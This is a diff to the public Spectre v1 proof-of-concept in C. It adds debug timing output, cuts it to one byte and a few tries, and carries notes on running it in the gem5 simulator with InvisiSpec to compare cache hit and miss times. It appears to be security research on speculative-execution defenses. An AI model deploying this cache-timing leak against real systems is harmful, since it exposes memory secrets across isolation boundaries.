@@ -1,3 +1,21 @@
+/*
+Newly added row :
+        111 113 114 115 116 117  Output measurement time
+        158         To save time, read only one byte
+
+
+gcc spectre_full.c -o spectre   
+./spectre
+hit time ≈ 64   miss time ≈ 160
+
+build/X86/gem5.opt configs/example/se.py -c attack_code/spectre --cpu-type=DerivO3CPU  --l1d_size=64kB --l1i_size=16kB --caches
+hit time ≈ 60   miss time ≈ 290
+
+InvisiSpec : UnsafeBaseline
+hit time ≈ 46   miss time ≈ 46
+
+*/
+
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -53,16 +71,17 @@ Analysis code
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2],int index) {
   static int results[256];
-  int tries, i, j, k, mix_i, junk = 0;
+  int tries, i, j, k, mix_i;
+  unsigned int junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
-
+  printf("secret=%c %d\n",secret[index],secret[index]);  
   for (i = 0; i < 256; i++)
     results[i] = 0;
-  for (tries = 999; tries > 0; tries--) {
+  for (tries = 3; tries > 0; tries--) {
 
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
@@ -99,9 +118,26 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       time2 = __rdtscp( & junk) - time1;
       /* READ TIMER & COMPUTE ELAPSED TIME */
       time2 = __rdtscp( & junk) - time1;
-      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-        results[mix_i]++; /* cache hit - add +1 to score for this value */
+	  
+	  if(mix_i==(int)secret[index]){
+          printf("  secret here ********mix_i=%d , time=%lu**********\n",mix_i,time2);
+
+	  }
+//	  printf("index=%d,secret[index]=%c",index,secret[index]);
+      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]){
+          printf("  hit   ********mix_i=%d , time=%lu**********\n",mix_i,time2);  
+          results[mix_i]++; /* cache hit - add +1 to score for this value */
+      }
+	  else{
+         if(mix_i == array1[tries % array1_size])
+         printf("  mix_i = array1[tries %% array1_size] : mix_i=%d , time=%lu\n"\
+		 ,mix_i,time2);
+      //   else
+        // printf("miss : mix_i=%d , time=%lu\n",mix_i,time2);
+      }
+       
     }
+	printf("\n");
 
     /* Locate highest & second-highest results results tallies in j/k */
     j = k = -1;
@@ -129,7 +165,7 @@ int main(int argc,
   /* default for malicious_x */
   size_t malicious_x = (size_t)(secret - (char * ) array1);
 
-  int i, score[2], len = 40;
+  int i, score[2], len = 40,ind=0;
   uint8_t value[2];
 
   for (i = 0; i < sizeof(array2); i++)
@@ -139,11 +175,13 @@ int main(int argc,
     malicious_x -= (size_t) array1; /* Convert input value into a pointer */
     sscanf(argv[2], "%d", & len);
   }
-
+  len =1;    //only 
+  ind = len;
   printf("Reading %d bytes:\n", len);
   while (--len >= 0) {
+    printf("len=%d\n",10-len);
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
-    readMemoryByte(malicious_x++, value, score);
+    readMemoryByte(malicious_x++, value, score,(ind-1-len));
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
       (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
